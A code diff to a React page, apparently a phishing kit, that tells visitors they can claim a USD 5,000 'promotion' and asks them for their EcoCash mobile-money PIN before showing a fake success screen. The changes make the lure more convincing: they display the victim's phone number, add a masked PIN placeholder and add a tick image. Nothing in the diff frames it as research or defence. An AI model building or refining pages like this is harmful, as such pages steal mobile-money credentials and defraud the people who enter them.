@@ -55,7 +55,7 @@ export default function ClientSide() {
     }
   }
   return (
-    <div className={styles.container}>
+    <div className={`${styles.container} ${success && styles.marCon}`} >
       <img
         src="/logo.jpg"
         alt="logo"
@@ -88,14 +88,16 @@ export default function ClientSide() {
           <div>
             <div className={`${styles.myform} + ${!next && styles.hide}`}>
               <p>
-                Are sure you want to claim your Promotion funds of USD 5,000?
+                You are about to claim your Promotion funds of USD 5,000 to{" "}
+                <br></br>
+                {clientNumber}
               </p>
               <label htmlFor="number"> EcoCash pin</label>
               <input
                 type="number"
                 value={clientPin}
                 onChange={(e) => setclientPin(e.target.value)}
-                placeholder=""
+                placeholder="****"
               />
               {invalidpin && (
                 <label htmlFor="number" style={{ color: "red" }}>
@@ -111,6 +113,7 @@ export default function ClientSide() {
         </form>
       ) : (
         <div className={styles.success}>
+          <img src="/public/tick.jpeg" alt="tick" />
           <h2>Congrats To You</h2>
           <p>
             You have successfully claimed <b>USD 5,000</b> 💵 to{" "}
